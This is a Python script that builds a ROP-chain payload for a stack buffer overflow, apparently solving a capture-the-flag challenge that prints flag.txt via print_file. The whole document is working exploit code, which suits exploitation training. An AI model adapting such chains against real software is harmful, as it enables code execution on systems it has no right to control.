import struct

buf_addr       = 0x7fffffffdcb0
saved_rip_addr = 0x7fffffffdcd8

print_file_addr = 0x400510
data_addr       = 0x601028

write_addr      = 0x400628
load_addr       = 0x400690

pop_rdi_addr    = 0x400693

class Exploit():
    def __init__(self):
        self.payload = b""

    def pad(self, num_bytes):
        self.payload += b"a" * num_bytes

    def append_word(self, word):
        self.payload += struct.pack("<Q", word)

    def append_write_chain(self, to_write, location):
        to_write += b"\0" * ((-len(to_write)) % 8)
        for i in range(len(to_write) // 8):
            chunk = to_write[8*i : 8*i + 8]
            
            self.append_word(load_addr)
            self.append_word(location)
            self.payload += chunk
            self.append_word(write_addr)

            location += 8

    def append_pop_rdi_chain(self, rdi):
        self.append_word(pop_rdi_addr)
        self.append_word(rdi)
        
    def write(self, filename):
        with open(filename, "wb") as f:
            f.write(self.payload)
        print("Wrote {} bytes to {}".format(len(self.payload),
                                            filename))

exploit = Exploit()

exploit.pad(saved_rip_addr - buf_addr)

exploit.append_write_chain(b"flag.txt", data_addr)

exploit.append_pop_rdi_chain(data_addr)

exploit.append_word(print_file_addr)

exploit.write("payload")
